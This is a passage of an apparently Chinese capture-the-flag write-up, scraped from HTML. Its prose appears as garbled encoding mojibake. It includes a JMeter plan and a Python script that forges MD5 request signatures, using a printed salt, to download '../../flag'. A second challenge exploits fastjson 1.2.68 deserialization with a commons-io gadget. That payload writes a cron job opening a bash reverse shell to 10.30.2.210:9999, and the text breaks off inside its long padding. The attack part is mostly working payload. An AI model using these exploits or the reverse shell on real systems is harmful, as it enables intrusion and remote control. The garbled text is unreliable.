class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>sign<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;sign&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Argument.metadata<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collectionProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.domain<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>localhost<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.port<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>8080<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.protocol<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>http<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.contentEncoding<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.path<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>/download<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GET<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.follow_redirects<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.auto_redirects<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.use_keepalive<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.DO_MULTIPART_POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.body_data<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.bypass_proxy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_host<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_port<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_username<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.proxy_password<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSampler.implementation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>HttpClient4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTTPSamplerProxy</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hashTree</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jmeterTestPlan</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­çš„ hashTree éƒ¨åˆ†æ˜¯ç­¾åçš„ç®—æ³•ï¼Œsalt æ˜¯ <code>f9bc855c9df15ba7602945fb939deefc</code></p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">def</span> mingWen <span class="token operator">=</span> vars<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'mingWen'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> firstMi <span class="token operator">=</span> DigestUtils<span class="token punctuation">.</span><span class="token function">md5Hex</span><span class="token punctuation">(</span>mingWen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> jieStr <span class="token operator">=</span> firstMi<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> salt <span class="token operator">=</span> vars<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'salt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> newStr <span class="token operator">=</span> firstMi <span class="token operator">+</span> jieStr <span class="token operator">+</span> salt<span class="token punctuation">;</span><span class="token keyword">def</span> sign <span class="token operator">=</span> DigestUtils<span class="token punctuation">.</span><span class="token function">md5Hex</span><span class="token punctuation">(</span>newStr<span class="token punctuation">)</span><span class="token punctuation">;</span>vars<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'sign'</span><span class="token punctuation">,</span> sign<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®é™…ä¸Šæ˜¯åŸå§‹ md5 åŠ ä¸Š md5 åæˆªå–ä¸€éƒ¨åˆ†åˆåŠ ä¸Šç›å€¼åå†æ¬¡ md5</p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib  <span class="token keyword">def</span> calculate_sign<span class="token punctuation">(</span>mingWen<span class="token punctuation">)</span><span class="token punctuation">:</span>      firstMi <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingWen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>      jieStr <span class="token operator">=</span> firstMi<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>    salt <span class="token operator">=</span> <span class="token string">"f9bc855c9df15ba7602945fb939deefc"</span>    newStr <span class="token operator">=</span> firstMi <span class="token operator">+</span> jieStr <span class="token operator">+</span> salt       sign <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>newStr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> sign<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç­¾å ..&#x2F;..&#x2F;flag ä¼ å‚å³å¯</p><hr><h2 id="Sunsetï¼ˆå¤ç°ï¼‰"><a href="#Sunsetï¼ˆå¤ç°ï¼‰" class="headerlink" title="Sunsetï¼ˆå¤ç°ï¼‰"></a>Sunsetï¼ˆå¤ç°ï¼‰</h2><p>ä¸€ä¸ª java æœåŠ¡</p><p><code>admin:123456</code> ç™»å½•</p><p>æ¥åˆ°é‡ç½®å¯†ç å¤„ï¼ŒæŠ“åŒ…å‘ç°ä¼ å…¥çš„æ˜¯ jsonï¼Œå°è¯•æ¢æµ‹</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span>a<span class="token punctuation">[</span><span class="token property">"test"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿”å›</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"timestamp"</span><span class="token operator">:</span><span class="token string">"2025-12-06T07:44:10.100+0000"</span><span class="token punctuation">,</span><span class="token property">"status"</span><span class="token operator">:</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token property">"error"</span><span class="token operator">:</span><span class="token string">"Internal Server Error"</span><span class="token punctuation">,</span><span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"syntax error, expect &#123;, actual error, pos 36, fastjson-version 1.2.68"</span><span class="token punctuation">,</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token string">"/admin/resetPassword"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦æ‰“ fastjson 1.2.68 ååºåˆ—åŒ–</p><p>æ¢æµ‹ä¸€ä¸‹åŒ…ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"x"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Character"</span><span class="token punctuation">&#123;</span>  <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>  <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.Charsets"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å› </p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token string">"2026-01-08T06:53:37.910+0000"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">500</span><span class="token punctuation">,</span>  <span class="token property">"error"</span><span class="token operator">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">,</span>  <span class="token property">"message"</span><span class="token operator">:</span> <span class="token string">"can not cast to char, value : class org.apache.commons.io.Charsets"</span><span class="token punctuation">,</span>  <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/admin/resetPassword"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­˜åœ¨ commons-io</p><p>å¯ä»¥ç›´æ¥å†™è®¡åˆ’ä»»åŠ¡åå¼¹ shell</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.alibaba.fastjson.JSONObject"</span><span class="token punctuation">,</span>    <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.ReaderInputStream"</span><span class="token punctuation">,</span>      <span class="token property">"reader"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.CharSequenceReader"</span><span class="token punctuation">,</span>        <span class="token property">"charSequence"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.String"</span>"* * * * * root bash -c 'bash -i >&amp; /dev/tcp/<span class="token number">10.30</span>.<span class="token number">2.210</span>/<span class="token number">9999</span> <span class="token number">0</span>>&amp;<span class="token number">1</span>' #aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa